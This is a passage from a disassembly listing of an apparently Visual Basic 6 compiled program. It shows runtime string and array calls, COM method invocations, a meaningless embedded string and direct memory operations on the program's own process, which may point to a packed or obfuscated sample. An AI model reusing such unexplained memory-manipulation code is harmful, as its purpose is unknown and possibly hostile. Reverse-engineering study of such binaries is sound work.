.text:00409F47                 push    1Ch
.text:00409F49                 push    offset dword_4027CC
.text:00409F4E                 push    dword ptr [ebp+8]
.text:00409F51                 push    dword ptr [ebp-30h]
.text:00409F54                 call    __vbaHresultCheckObj
.text:00409F59                 mov     [ebp-3Ch], eax
.text:00409F5C                 jmp     short loc_409F62
.text:00409F5E ; ---------------------------------------------------------------------------
.text:00409F5E
.text:00409F5E loc_409F5E:                             ; CODE XREF: .text:00409F45↑j
.text:00409F5E                 and     dword ptr [ebp-3Ch], 0
.text:00409F62
.text:00409F62 loc_409F62:                             ; CODE XREF: .text:00409F5C↑j
.text:00409F62                 push    offset sub_409F7C
.text:00409F67                 jmp     short loc_409F73
.text:00409F69 ; ---------------------------------------------------------------------------
.text:00409F69                 lea     eax, [ebp-1Ch]
.text:00409F6C                 push    eax
.text:00409F6D                 call    __vbaAryUnlock
.text:00409F72                 retn
.text:00409F73 ; ---------------------------------------------------------------------------
.text:00409F73
.text:00409F73 loc_409F73:                             ; CODE XREF: .text:00409F67↑j
.text:00409F73                 lea     ecx, [ebp-18h]
.text:00409F76                 call    __vbaFreeStr
.text:00409F7B                 retn
.text:00409F7C
.text:00409F7C ; =============== S U B R O U T I N E =======================================
.text:00409F7C
.text:00409F7C
.text:00409F7C sub_409F7C      proc near               ; DATA XREF: .text:loc_409F62↑o
.text:00409F7C                 mov     eax, [ebp+8]
.text:00409F7F                 mov     eax, [eax]
.text:00409F81                 push    dword ptr [ebp+8]
.text:00409F84                 call    dword ptr [eax+8]
.text:00409F87                 mov     eax, [ebp-4]
.text:00409F8A                 mov     ecx, [ebp-14h]
.text:00409F8D                 mov     large fs:0, ecx
.text:00409F94                 pop     edi
.text:00409F95                 pop     esi
.text:00409F96                 pop     ebx
.text:00409F97                 leave
.text:00409F98                 retn    0Ch
.text:00409F98 sub_409F7C      endp ; sp-analysis failed
.text:00409F98
.text:00409F9B
.text:00409F9B ; =============== S U B R O U T I N E =======================================
.text:00409F9B
.text:00409F9B ; Attributes: bp-based frame
.text:00409F9B
.text:00409F9B sub_409F9B      proc near               ; CODE XREF: sub_40D3DE+6E↓p
.text:00409F9B                                         ; sub_40D3DE+9B↓p
.text:00409F9B
.text:00409F9B var_90          = dword ptr -90h
.text:00409F9B var_8C          = dword ptr -8Ch
.text:00409F9B var_88          = dword ptr -88h
.text:00409F9B var_84          = dword ptr -84h
.text:00409F9B var_80          = dword ptr -80h
.text:00409F9B var_7C          = dword ptr -7Ch
.text:00409F9B var_78          = dword ptr -78h
.text:00409F9B var_74          = dword ptr -74h
.text:00409F9B var_70          = dword ptr -70h
.text:00409F9B var_6C          = dword ptr -6Ch
.text:00409F9B var_64          = dword ptr -64h
.text:00409F9B var_60          = dword ptr -60h
.text:00409F9B var_5C          = dword ptr -5Ch
.text:00409F9B var_58          = dword ptr -58h
.text:00409F9B var_54          = dword ptr -54h
.text:00409F9B var_50          = dword ptr -50h
.text:00409F9B var_4C          = dword ptr -4Ch
.text:00409F9B var_48          = dword ptr -48h
.text:00409F9B var_44          = dword ptr -44h
.text:00409F9B var_40          = dword ptr -40h
.text:00409F9B var_3C          = dword ptr -3Ch
.text:00409F9B var_38          = dword ptr -38h
.text:00409F9B var_34          = dword ptr -34h
.text:00409F9B var_30          = dword ptr -30h
.text:00409F9B var_2C          = dword ptr -2Ch
.text:00409F9B var_28          = dword ptr -28h
.text:00409F9B var_24          = dword ptr -24h
.text:00409F9B var_20          = dword ptr -20h
.text:00409F9B var_1C          = dword ptr -1Ch
.text:00409F9B var_18          = dword ptr -18h
.text:00409F9B var_14          = byte ptr -14h
.text:00409F9B var_10          = dword ptr -10h
.text:00409F9B var_8           = dword ptr -8
.text:00409F9B var_4           = dword ptr -4
.text:00409F9B arg_0           = dword ptr  8
.text:00409F9B arg_4           = byte ptr  0Ch
.text:00409F9B arg_8           = dword ptr  10h
.text:00409F9B arg_C           = byte ptr  14h
.text:00409F9B
.text:00409F9B                 push    ebp
.text:00409F9C                 mov     ebp, esp
.text:00409F9E                 push    ecx
.text:00409F9F                 push    ecx
.text:00409FA0                 push    offset __vbaExceptHandler
.text:00409FA5                 mov     eax, large fs:0
.text:00409FAB                 push    eax
.text:00409FAC                 mov     large fs:0, esp
.text:00409FB3                 mov     eax, 80h
.text:00409FB8                 call    __vbaChkstk
.text:00409FBD                 push    ebx
.text:00409FBE                 push    esi
.text:00409FBF                 push    edi
.text:00409FC0                 mov     [ebp+var_8], esp
.text:00409FC3                 mov     [ebp+var_4], offset dword_401268
.text:00409FCA                 mov     edx, [ebp+arg_8]
.text:00409FCD                 lea     ecx, [ebp+var_14]
.text:00409FD0                 call    __vbaStrCopy
.text:00409FD5                 push    offset dword_40E094
.text:00409FDA                 call    sub_40A464
.text:00409FDF                 mov     [ebp+var_5C], eax
.text:00409FE2                 cmp     dword_40E0AC, 0
.text:00409FE9                 jnz     short loc_40A003
.text:00409FEB                 push    offset dword_40E0AC
.text:00409FF0                 push    offset dword_401960
.text:00409FF5                 call    __vbaNew2
.text:00409FFA                 mov     [ebp+var_6C], offset dword_40E0AC
.text:0040A001                 jmp     short loc_40A00A
.text:0040A003 ; ---------------------------------------------------------------------------
.text:0040A003
.text:0040A003 loc_40A003:                             ; CODE XREF: sub_409F9B+4E↑j
.text:0040A003                 mov     [ebp+var_6C], offset dword_40E0AC
.text:0040A00A
.text:0040A00A loc_40A00A:                             ; CODE XREF: sub_409F9B+66↑j
.text:0040A00A                 mov     eax, [ebp+var_6C]
.text:0040A00D                 mov     eax, [eax]
.text:0040A00F                 mov     [ebp+var_60], eax
.text:0040A012                 and     [ebp+var_54], 0
.text:0040A016                 and     [ebp+var_50], 0
.text:0040A01A                 and     [ebp+var_4C], 0
.text:0040A01E                 and     [ebp+var_48], 0
.text:0040A022                 and     [ebp+var_44], 0
.text:0040A026                 and     [ebp+var_40], 0
.text:0040A02A                 and     [ebp+var_3C], 0
.text:0040A02E                 and     [ebp+var_38], 0
.text:0040A032                 mov     eax, [ebp+var_5C]
.text:0040A035                 mov     [ebp+var_34], eax
.text:0040A038                 mov     [ebp+var_30], 1
.text:0040A03F                 lea     eax, [ebp+var_58]
.text:0040A042                 push    eax
.text:0040A043                 lea     eax, [ebp+var_54]
.text:0040A046                 push    eax
.text:0040A047                 lea     eax, [ebp+var_50]
.text:0040A04A                 push    eax
.text:0040A04B                 lea     eax, [ebp+var_4C]
.text:0040A04E                 push    eax
.text:0040A04F                 lea     eax, [ebp+var_48]
.text:0040A052                 push    eax
.text:0040A053                 lea     eax, [ebp+var_44]
.text:0040A056                 push    eax
.text:0040A057                 lea     eax, [ebp+var_40]
.text:0040A05A                 push    eax
.text:0040A05B                 lea     eax, [ebp+var_3C]
.text:0040A05E                 push    eax
.text:0040A05F                 lea     eax, [ebp+var_38]
.text:0040A062                 push    eax
.text:0040A063                 lea     eax, [ebp+var_34]
.text:0040A066                 push    eax
.text:0040A067                 lea     eax, [ebp+var_30]
.text:0040A06A                 push    eax
.text:0040A06B                 push    dword_40E138
.text:0040A071                 push    dword_40E078
.text:0040A077                 mov     eax, [ebp+var_60]
.text:0040A07A                 mov     eax, [eax]
.text:0040A07C                 push    [ebp+var_60]
.text:0040A07F                 call    dword ptr [eax+30h]
.text:0040A082                 fnclex
.text:0040A084                 mov     [ebp+var_64], eax
.text:0040A087                 cmp     [ebp+var_64], 0
.text:0040A08B                 jge     short loc_40A0A4
.text:0040A08D                 push    30h ; '0'
.text:0040A08F                 push    offset dword_4027CC
.text:0040A094                 push    [ebp+var_60]
.text:0040A097                 push    [ebp+var_64]
.text:0040A09A                 call    __vbaHresultCheckObj
.text:0040A09F                 mov     [ebp+var_70], eax
.text:0040A0A2                 jmp     short loc_40A0A8
.text:0040A0A4 ; ---------------------------------------------------------------------------
.text:0040A0A4
.text:0040A0A4 loc_40A0A4:                             ; CODE XREF: sub_409F9B+F0↑j
.text:0040A0A4                 and     [ebp+var_70], 0
.text:0040A0A8
.text:0040A0A8 loc_40A0A8:                             ; CODE XREF: sub_409F9B+107↑j
.text:0040A0A8                 mov     eax, [ebp+var_58]
.text:0040A0AB                 mov     [ebp+var_1C], eax
.text:0040A0AE                 lea     eax, [ebp+var_14]
.text:0040A0B1                 push    eax
.text:0040A0B2                 call    sub_40A464
.text:0040A0B7                 mov     [ebp+var_50], eax
.text:0040A0BA                 cmp     dword_40E0AC, 0
.text:0040A0C1                 jnz     short loc_40A0DB
.text:0040A0C3                 push    offset dword_40E0AC
.text:0040A0C8                 push    offset dword_401960
.text:0040A0CD                 call    __vbaNew2
.text:0040A0D2                 mov     [ebp+var_74], offset dword_40E0AC
.text:0040A0D9                 jmp     short loc_40A0E2
.text:0040A0DB ; ---------------------------------------------------------------------------
.text:0040A0DB
.text:0040A0DB loc_40A0DB:                             ; CODE XREF: sub_409F9B+126↑j
.text:0040A0DB                 mov     [ebp+var_74], offset dword_40E0AC
.text:0040A0E2
.text:0040A0E2 loc_40A0E2:                             ; CODE XREF: sub_409F9B+13E↑j
.text:0040A0E2                 mov     eax, [ebp+var_74]
.text:0040A0E5                 mov     eax, [eax]
.text:0040A0E7                 mov     [ebp+var_60], eax
.text:0040A0EA                 and     [ebp+var_48], 0
.text:0040A0EE                 and     [ebp+var_44], 0
.text:0040A0F2                 and     [ebp+var_40], 0
.text:0040A0F6                 and     [ebp+var_3C], 0
.text:0040A0FA                 and     [ebp+var_38], 0
.text:0040A0FE                 mov     eax, [ebp+var_50]
.text:0040A101                 mov     [ebp+var_34], eax
.text:0040A104                 mov     [ebp+var_30], 4
.text:0040A10B                 lea     eax, [ebp+var_4C]
.text:0040A10E                 push    eax
.text:0040A10F                 lea     eax, [ebp+var_48]
.text:0040A112                 push    eax
.text:0040A113                 lea     eax, [ebp+var_44]
.text:0040A116                 push    eax
.text:0040A117                 lea     eax, [ebp+var_40]
.text:0040A11A                 push    eax
.text:0040A11B                 lea     eax, [ebp+var_3C]
.text:0040A11E                 push    eax
.text:0040A11F                 lea     eax, [ebp+var_38]
.text:0040A122                 push    eax
.text:0040A123                 lea     eax, [ebp+arg_C]
.text:0040A126                 push    eax
.text:0040A127                 lea     eax, [ebp+var_34]
.text:0040A12A                 push    eax
.text:0040A12B                 lea     eax, [ebp+arg_4]
.text:0040A12E                 push    eax
.text:0040A12F                 lea     eax, [ebp+var_1C]
.text:0040A132                 push    eax
.text:0040A133                 lea     eax, [ebp+var_30]
.text:0040A136                 push    eax
.text:0040A137                 push    dword_40E120
.text:0040A13D                 push    dword_40E078
.text:0040A143                 mov     eax, [ebp+var_60]
.text:0040A146                 mov     eax, [eax]
.text:0040A148                 push    [ebp+var_60]
.text:0040A14B                 call    dword ptr [eax+30h]
.text:0040A14E                 fnclex
.text:0040A150                 mov     [ebp+var_64], eax
.text:0040A153                 cmp     [ebp+var_64], 0
.text:0040A157                 jge     short loc_40A170
.text:0040A159                 push    30h ; '0'
.text:0040A15B                 push    offset dword_4027CC
.text:0040A160                 push    [ebp+var_60]
.text:0040A163                 push    [ebp+var_64]
.text:0040A166                 call    __vbaHresultCheckObj
.text:0040A16B                 mov     [ebp+var_78], eax
.text:0040A16E                 jmp     short loc_40A174
.text:0040A170 ; ---------------------------------------------------------------------------
.text:0040A170
.text:0040A170 loc_40A170:                             ; CODE XREF: sub_409F9B+1BC↑j
.text:0040A170                 and     [ebp+var_78], 0
.text:0040A174
.text:0040A174 loc_40A174:                             ; CODE XREF: sub_409F9B+1D3↑j
.text:0040A174                 mov     eax, [ebp+var_4C]
.text:0040A177                 mov     [ebp+var_18], eax
.text:0040A17A                 cmp     dword_40E0AC, 0
.text:0040A181                 jnz     short loc_40A19B
.text:0040A183                 push    offset dword_40E0AC
.text:0040A188                 push    offset dword_401960
.text:0040A18D                 call    __vbaNew2
.text:0040A192                 mov     [ebp+var_7C], offset dword_40E0AC
.text:0040A199                 jmp     short loc_40A1A2
.text:0040A19B ; ---------------------------------------------------------------------------
.text:0040A19B
.text:0040A19B loc_40A19B:                             ; CODE XREF: sub_409F9B+1E6↑j
.text:0040A19B                 mov     [ebp+var_7C], offset dword_40E0AC
.text:0040A1A2
.text:0040A1A2 loc_40A1A2:                             ; CODE XREF: sub_409F9B+1FE↑j
.text:0040A1A2                 mov     eax, [ebp+var_7C]
.text:0040A1A5                 mov     eax, [eax]
.text:0040A1A7                 mov     [ebp+var_60], eax
.text:0040A1AA                 and     [ebp+var_4C], 0
.text:0040A1AE                 and     [ebp+var_48], 0
.text:0040A1B2                 and     [ebp+var_44], 0
.text:0040A1B6                 and     [ebp+var_40], 0
.text:0040A1BA                 and     [ebp+var_3C], 0
.text:0040A1BE                 and     [ebp+var_38], 0
.text:0040A1C2                 and     [ebp+var_34], 0
.text:0040A1C6                 mov     [ebp+var_30], 2
.text:0040A1CD                 lea     eax, [ebp+var_50]
.text:0040A1D0                 push    eax
.text:0040A1D1                 lea     eax, [ebp+var_4C]
.text:0040A1D4                 push    eax
.text:0040A1D5                 lea     eax, [ebp+var_48]
.text:0040A1D8                 push    eax
.text:0040A1D9                 lea     eax, [ebp+var_44]
.text:0040A1DC                 push    eax
.text:0040A1DD                 lea     eax, [ebp+var_40]
.text:0040A1E0                 push    eax
.text:0040A1E1                 lea     eax, [ebp+var_3C]
.text:0040A1E4                 push    eax
.text:0040A1E5                 lea     eax, [ebp+var_38]
.text:0040A1E8                 push    eax
.text:0040A1E9                 lea     eax, [ebp+var_34]
.text:0040A1EC                 push    eax
.text:0040A1ED                 lea     eax, [ebp+var_18]
.text:0040A1F0                 push    eax
.text:0040A1F1                 lea     eax, [ebp+var_1C]
.text:0040A1F4                 push    eax
.text:0040A1F5                 lea     eax, [ebp+var_30]
.text:0040A1F8                 push    eax
.text:0040A1F9                 push    dword_40E118
.text:0040A1FF                 push    dword_40E078
.text:0040A205                 mov     eax, [ebp+var_60]
.text:0040A208                 mov     eax, [eax]
.text:0040A20A                 push    [ebp+var_60]
.text:0040A20D                 call    dword ptr [eax+30h]
.text:0040A210                 fnclex
.text:0040A212                 mov     [ebp+var_64], eax
.text:0040A215                 cmp     [ebp+var_64], 0
.text:0040A219                 jge     short loc_40A232
.text:0040A21B                 push    30h ; '0'
.text:0040A21D                 push    offset dword_4027CC
.text:0040A222                 push    [ebp+var_60]
.text:0040A225                 push    [ebp+var_64]
.text:0040A228                 call    __vbaHresultCheckObj
.text:0040A22D                 mov     [ebp+var_80], eax
.text:0040A230                 jmp     short loc_40A236
.text:0040A232 ; ---------------------------------------------------------------------------
.text:0040A232
.text:0040A232 loc_40A232:                             ; CODE XREF: sub_409F9B+27E↑j
.text:0040A232                 and     [ebp+var_80], 0
.text:0040A236
.text:0040A236 loc_40A236:                             ; CODE XREF: sub_409F9B+295↑j
.text:0040A236                 mov     eax, [ebp+var_50]
.text:0040A239                 mov     [ebp+var_20], eax
.text:0040A23C                 cmp     dword_40E0AC, 0
.text:0040A243                 jnz     short loc_40A260
.text:0040A245                 push    offset dword_40E0AC
.text:0040A24A                 push    offset dword_401960
.text:0040A24F                 call    __vbaNew2
.text:0040A254                 mov     [ebp+var_84], offset dword_40E0AC
.text:0040A25E                 jmp     short loc_40A26A
.text:0040A260 ; ---------------------------------------------------------------------------
.text:0040A260
.text:0040A260 loc_40A260:                             ; CODE XREF: sub_409F9B+2A8↑j
.text:0040A260                 mov     [ebp+var_84], offset dword_40E0AC
.text:0040A26A
.text:0040A26A loc_40A26A:                             ; CODE XREF: sub_409F9B+2C3↑j
.text:0040A26A                 mov     eax, [ebp+var_84]
.text:0040A270                 mov     eax, [eax]
.text:0040A272                 mov     [ebp+var_60], eax
.text:0040A275                 and     [ebp+var_50], 0
.text:0040A279                 and     [ebp+var_4C], 0
.text:0040A27D                 and     [ebp+var_48], 0
.text:0040A281                 and     [ebp+var_44], 0
.text:0040A285                 and     [ebp+var_40], 0
.text:0040A289                 and     [ebp+var_3C], 0
.text:0040A28D                 and     [ebp+var_38], 0
.text:0040A291                 and     [ebp+var_34], 0
.text:0040A295                 mov     [ebp+var_30], 1
.text:0040A29C                 lea     eax, [ebp+var_54]
.text:0040A29F                 push    eax
.text:0040A2A0                 lea     eax, [ebp+var_50]
.text:0040A2A3                 push    eax
.text:0040A2A4                 lea     eax, [ebp+var_4C]
.text:0040A2A7                 push    eax
.text:0040A2A8                 lea     eax, [ebp+var_48]
.text:0040A2AB                 push    eax
.text:0040A2AC                 lea     eax, [ebp+var_44]
.text:0040A2AF                 push    eax
.text:0040A2B0                 lea     eax, [ebp+var_40]
.text:0040A2B3                 push    eax
.text:0040A2B4                 lea     eax, [ebp+var_3C]
.text:0040A2B7                 push    eax
.text:0040A2B8                 lea     eax, [ebp+var_38]
.text:0040A2BB                 push    eax
.text:0040A2BC                 lea     eax, [ebp+var_34]
.text:0040A2BF                 push    eax
.text:0040A2C0                 lea     eax, [ebp+var_20]
.text:0040A2C3                 push    eax
.text:0040A2C4                 lea     eax, [ebp+var_30]
.text:0040A2C7                 push    eax
.text:0040A2C8                 push    dword_40E104
.text:0040A2CE                 push    dword_40E078
.text:0040A2D4                 mov     eax, [ebp+var_60]
.text:0040A2D7                 mov     eax, [eax]
.text:0040A2D9                 push    [ebp+var_60]
.text:0040A2DC                 call    dword ptr [eax+30h]
.text:0040A2DF                 fnclex
.text:0040A2E1                 mov     [ebp+var_64], eax
.text:0040A2E4                 cmp     [ebp+var_64], 0
.text:0040A2E8                 jge     short loc_40A304
.text:0040A2EA                 push    30h ; '0'
.text:0040A2EC                 push    offset dword_4027CC
.text:0040A2F1                 push    [ebp+var_60]
.text:0040A2F4                 push    [ebp+var_64]
.text:0040A2F7                 call    __vbaHresultCheckObj
.text:0040A2FC                 mov     [ebp+var_88], eax
.text:0040A302                 jmp     short loc_40A30B
.text:0040A304 ; ---------------------------------------------------------------------------
.text:0040A304
.text:0040A304 loc_40A304:                             ; CODE XREF: sub_409F9B+34D↑j
.text:0040A304                 and     [ebp+var_88], 0
.text:0040A30B
.text:0040A30B loc_40A30B:                             ; CODE XREF: sub_409F9B+367↑j
.text:0040A30B                 mov     eax, [ebp+var_54]
.text:0040A30E                 mov     [ebp+var_24], eax
.text:0040A311                 cmp     dword_40E0AC, 0
.text:0040A318                 jnz     short loc_40A335
.text:0040A31A                 push    offset dword_40E0AC
.text:0040A31F                 push    offset dword_401960
.text:0040A324                 call    __vbaNew2
.text:0040A329                 mov     [ebp+var_8C], offset dword_40E0AC
.text:0040A333                 jmp     short loc_40A33F
.text:0040A335 ; ---------------------------------------------------------------------------
.text:0040A335
.text:0040A335 loc_40A335:                             ; CODE XREF: sub_409F9B+37D↑j
.text:0040A335                 mov     [ebp+var_8C], offset dword_40E0AC
.text:0040A33F
.text:0040A33F loc_40A33F:                             ; CODE XREF: sub_409F9B+398↑j
.text:0040A33F                 mov     eax, [ebp+var_8C]
.text:0040A345                 mov     eax, [eax]
.text:0040A347                 mov     [ebp+var_60], eax
.text:0040A34A                 and     [ebp+var_4C], 0
.text:0040A34E                 and     [ebp+var_48], 0
.text:0040A352                 and     [ebp+var_44], 0
.text:0040A356                 and     [ebp+var_40], 0
.text:0040A35A                 and     [ebp+var_3C], 0
.text:0040A35E                 and     [ebp+var_38], 0
.text:0040A362                 and     [ebp+var_34], 0
.text:0040A366                 mov     [ebp+var_30], 2
.text:0040A36D                 lea     eax, [ebp+var_50]
.text:0040A370                 push    eax
.text:0040A371                 lea     eax, [ebp+var_4C]
.text:0040A374                 push    eax
.text:0040A375                 lea     eax, [ebp+var_48]
.text:0040A378                 push    eax
.text:0040A379                 lea     eax, [ebp+var_44]
.text:0040A37C                 push    eax
.text:0040A37D                 lea     eax, [ebp+var_40]
.text:0040A380                 push    eax
.text:0040A381                 lea     eax, [ebp+var_3C]
.text:0040A384                 push    eax
.text:0040A385                 lea     eax, [ebp+var_38]
.text:0040A388                 push    eax
.text:0040A389                 lea     eax, [ebp+var_34]
.text:0040A38C                 push    eax
.text:0040A38D                 lea     eax, [ebp+var_18]
.text:0040A390                 push    eax
.text:0040A391                 lea     eax, [ebp+var_1C]
.text:0040A394                 push    eax
.text:0040A395                 lea     eax, [ebp+var_30]
.text:0040A398                 push    eax
.text:0040A399                 push    dword_40E14C
.text:0040A39F                 push    dword_40E078
.text:0040A3A5                 mov     eax, [ebp+var_60]
.text:0040A3A8                 mov     eax, [eax]
.text:0040A3AA                 push    [ebp+var_60]
.text:0040A3AD                 call    dword ptr [eax+30h]
.text:0040A3B0                 fnclex
.text:0040A3B2                 mov     [ebp+var_64], eax
.text:0040A3B5                 cmp     [ebp+var_64], 0
.text:0040A3B9                 jge     short loc_40A3D5
.text:0040A3BB                 push    30h ; '0'
.text:0040A3BD                 push    offset dword_4027CC
.text:0040A3C2                 push    [ebp+var_60]
.text:0040A3C5                 push    [ebp+var_64]
.text:0040A3C8                 call    __vbaHresultCheckObj
.text:0040A3CD                 mov     [ebp+var_90], eax
.text:0040A3D3                 jmp     short loc_40A3DC
.text:0040A3D5 ; ---------------------------------------------------------------------------
.text:0040A3D5
.text:0040A3D5 loc_40A3D5:                             ; CODE XREF: sub_409F9B+41E↑j
.text:0040A3D5                 and     [ebp+var_90], 0
.text:0040A3DC
.text:0040A3DC loc_40A3DC:                             ; CODE XREF: sub_409F9B+438↑j
.text:0040A3DC                 mov     eax, [ebp+var_50]
.text:0040A3DF                 mov     [ebp+var_28], eax
.text:0040A3E2                 push    0
.text:0040A3E4                 push    [ebp+var_28]
.text:0040A3E7                 push    1
.text:0040A3E9                 push    11h
.text:0040A3EB                 push    [ebp+arg_0]
.text:0040A3EE                 push    1
.text:0040A3F0                 push    80h
.text:0040A3F5                 call    __vbaRedim
.text:0040A3FA                 add     esp, 1Ch
.text:0040A3FD                 mov     eax, [ebp+arg_0]
.text:0040A400                 push    dword ptr [eax]
.text:0040A402                 lea     eax, [ebp+var_2C]
.text:0040A405                 push    eax
.text:0040A406                 call    __vbaAryLock
.text:0040A40B                 push    0
.text:0040A40D                 push    [ebp+var_28]
.text:0040A410                 push    [ebp+var_24]
.text:0040A413                 mov     eax, [ebp+var_2C]
.text:0040A416                 xor     ecx, ecx
.text:0040A418                 sub     ecx, [eax+14h]
.text:0040A41B                 mov     eax, [ebp+var_2C]
.text:0040A41E                 mov     eax, [eax+0Ch]
.text:0040A421                 add     eax, ecx
.text:0040A423                 push    eax
.text:0040A424                 push    0FFFFFFFFh
.text:0040A426                 call    sub_4029F8
.text:0040A42B                 call    __vbaSetSystemError
.text:0040A430                 lea     eax, [ebp+var_2C]
.text:0040A433                 push    eax
.text:0040A434                 call    __vbaAryUnlock
.text:0040A439                 push    offset loc_40A453
.text:0040A43E                 jmp     short loc_40A44A
.text:0040A440 ; ---------------------------------------------------------------------------
.text:0040A440
.text:0040A440 loc_40A440:                             ; DATA XREF: .text:00401274↑o
.text:0040A440                 lea     eax, [ebp+var_2C]
.text:0040A443                 push    eax
.text:0040A444                 call    __vbaAryUnlock
.text:0040A449                 retn
.text:0040A44A ; ---------------------------------------------------------------------------
.text:0040A44A
.text:0040A44A loc_40A44A:                             ; CODE XREF: sub_409F9B+4A3↑j
.text:0040A44A                                         ; DATA XREF: .text:00401270↑o
.text:0040A44A                 lea     ecx, [ebp+var_14]
.text:0040A44D                 call    __vbaFreeStr
.text:0040A452                 retn
.text:0040A453 ; ---------------------------------------------------------------------------
.text:0040A453
.text:0040A453 loc_40A453:                             ; DATA XREF: sub_409F9B+49E↑o
.text:0040A453                 mov     ecx, [ebp+var_10]
.text:0040A456                 mov     large fs:0, ecx
.text:0040A45D                 pop     edi
.text:0040A45E                 pop     esi
.text:0040A45F                 pop     ebx
.text:0040A460                 leave
.text:0040A461                 retn    10h
.text:0040A461 sub_409F9B      endp ; sp-analysis failed
.text:0040A461
.text:0040A464
.text:0040A464 ; =============== S U B R O U T I N E =======================================
.text:0040A464
.text:0040A464 ; Attributes: bp-based frame
.text:0040A464
.text:0040A464 sub_40A464      proc near               ; CODE XREF: .text:00409EDD↑p
.text:0040A464                                         ; sub_409F9B+3F↑p ...
.text:0040A464
.text:0040A464 var_8           = dword ptr -8
.text:0040A464 var_4           = dword ptr -4
.text:0040A464 arg_0           = dword ptr  8
.text:0040A464
.text:0040A464                 push    ebp
.text:0040A465                 mov     ebp, esp
.text:0040A467                 push    8
.text:0040A469                 pop     eax
.text:0040A46A                 call    __vbaChkstk
.text:0040A46F                 push    1
.text:0040A471                 push    1
.text:0040A473                 push    [ebp+arg_0]
.text:0040A476                 call    sub_40D26B
.text:0040A47B                 mov     [ebp+var_8], eax
.text:0040A47E                 push    0
.text:0040A480                 push    4
.text:0040A482                 push    [ebp+var_8]
.text:0040A485                 lea     eax, [ebp+var_4]
.text:0040A488                 push    eax
.text:0040A489                 push    0FFFFFFFFh
.text:0040A48B                 call    sub_4029F8
.text:0040A490                 call    __vbaSetSystemError
.text:0040A495                 mov     eax, [ebp+var_4]
.text:0040A498                 leave
.text:0040A499                 retn    4
.text:0040A499 sub_40A464      endp
.text:0040A499
.text:0040A49C
.text:0040A49C ; =============== S U B R O U T I N E =======================================
.text:0040A49C
.text:0040A49C ; Attributes: bp-based frame
.text:0040A49C
.text:0040A49C sub_40A49C      proc near               ; CODE XREF: sub_40D3DE+4B↓p
.text:0040A49C                 push    ebp
.text:0040A49D                 mov     ebp, esp
.text:0040A49F                 pop     ebp
.text:0040A4A0                 retn
.text:0040A4A0 sub_40A49C      endp
.text:0040A4A0
.text:0040A4A1
.text:0040A4A1 ; =============== S U B R O U T I N E =======================================
.text:0040A4A1
.text:0040A4A1 ; Attributes: bp-based frame
.text:0040A4A1
.text:0040A4A1 sub_40A4A1      proc near               ; CODE XREF: .text:004082AE↑p
.text:0040A4A1                                         ; .text:00408335↑p ...
.text:0040A4A1
.text:0040A4A1 var_18          = byte ptr -18h
.text:0040A4A1 var_14          = dword ptr -14h
.text:0040A4A1 var_10          = dword ptr -10h
.text:0040A4A1 var_8           = dword ptr -8
.text:0040A4A1 var_4           = dword ptr -4
.text:0040A4A1
.text:0040A4A1                 push    ebp
.text:0040A4A2                 mov     ebp, esp
.text:0040A4A4                 push    ecx
.text:0040A4A5                 push    ecx
.text:0040A4A6                 push    offset __vbaExceptHandler
.text:0040A4AB                 mov     eax, large fs:0
.text:0040A4B1                 push    eax
.text:0040A4B2                 mov     large fs:0, esp
.text:0040A4B9                 push    0Ch
.text:0040A4BB                 pop     eax
.text:0040A4BC                 call    __vbaChkstk
.text:0040A4C1                 push    ebx
.text:0040A4C2                 push    esi
.text:0040A4C3                 push    edi
.text:0040A4C4                 mov     [ebp+var_8], esp
.text:0040A4C7                 mov     [ebp+var_4], offset dword_401278
.text:0040A4CE                 mov     edx, offset aEqzqpkxvbzbgst ; "eqzqpkxvbzbgst"
.text:0040A4D3                 lea     ecx, [ebp+var_18]
.text:0040A4D6                 call    __vbaStrCopy
.text:0040A4DB                 push    offset loc_40A4E9
.text:0040A4E0
.text:0040A4E0 loc_40A4E0:                             ; DATA XREF: .text:00401280↑o
.text:0040A4E0                 lea     ecx, [ebp+var_18]
.text:0040A4E3                 call    __vbaFreeStr
.text:0040A4E8                 retn
.text:0040A4E9 ; ---------------------------------------------------------------------------
.text:0040A4E9
.text:0040A4E9 loc_40A4E9:                             ; DATA XREF: sub_40A4A1+3A↑o
.text:0040A4E9                 mov     eax, [ebp+var_14]
.text:0040A4EC                 mov     ecx, [ebp+var_10]
.text:0040A4EF                 mov     large fs:0, ecx
.text:0040A4F6                 pop     edi
.text:0040A4F7                 pop     esi
.text:0040A4F8                 pop     ebx
.text:0040A4F9                 leave
.text:0040A4FA                 retn    0Ch
.text:0040A4FA sub_40A4A1      endp ; sp-analysis failed
.text:0040A4FA
.text:0040A4FD
.text:0040A4FD ; =============== S U B R O U T I N E =======================================
.text:0040A4FD
.text:0040A4FD ; Attributes: bp-based frame
.text:0040A4FD
.text:0040A4FD sub_40A4FD      proc near               ; CODE XREF: sub_40D3DE+46↓p
.text:0040A4FD                 push    ebp
.text:0040A4FE                 mov     ebp, esp
.text:0040A500                 pop     ebp
.text:0040A501                 retn
.text:0040A501 sub_40A4FD      endp
.text:0040A501
.text:0040A502
.text:0040A502 ; =============== S U B R O U T I N E =======================================
.text:0040A502
.text:0040A502 ; Attributes: bp-based frame
.text:0040A502
.text:0040A502 sub_40A502      proc near               ; CODE XREF: .text:00407C7C↑p
.text:0040A502                                         ; sub_40BF67+2CA↓p
.text:0040A502                                         ; DATA XREF: ...
.text:0040A502
.text:0040A502 var_AC          = dword ptr -0ACh
.text:0040A502 var_A4          = dword ptr -0A4h
.text:0040A502 var_A0          = dword ptr -0A0h
.text:0040A502 var_5C          = dword ptr -5Ch
.text:0040A502 var_54          = dword ptr -54h
.text:0040A502 var_4C          = dword ptr -4Ch
.text:0040A502 var_44          = dword ptr -44h
.text:0040A502 var_3C          = dword ptr -3Ch
.text:0040A502 var_34          = dword ptr -34h
.text:0040A502 var_2C          = dword ptr -2Ch
.text:0040A502 var_24          = dword ptr -24h
.text:0040A502 var_1C          = byte ptr -1Ch
.text:0040A502 var_18          = byte ptr -18h
.text:0040A502 var_14          = dword ptr -14h
.text:0040A502 var_10          = dword ptr -10h
.text:0040A502 var_8           = dword ptr -8
.text:0040A502 var_4           = dword ptr -4
.text:0040A502
.text:0040A502                 push    ebp
.text:0040A503                 mov     ebp, esp
.text:0040A505                 push    ecx
.text:0040A506                 push    ecx
.text:0040A507                 push    offset __vbaExceptHandler
.text:0040A50C                 mov     eax, large fs:0
.text:0040A512                 push    eax
.text:0040A513                 mov     large fs:0, esp
.text:0040A51A                 mov     eax, 9Ch
.text:0040A51F                 call    __vbaChkstk
.text:0040A524                 push    ebx
.text:0040A525                 push    esi
.text:0040A526                 push    edi
.text:0040A527                 mov     [ebp+var_8], esp
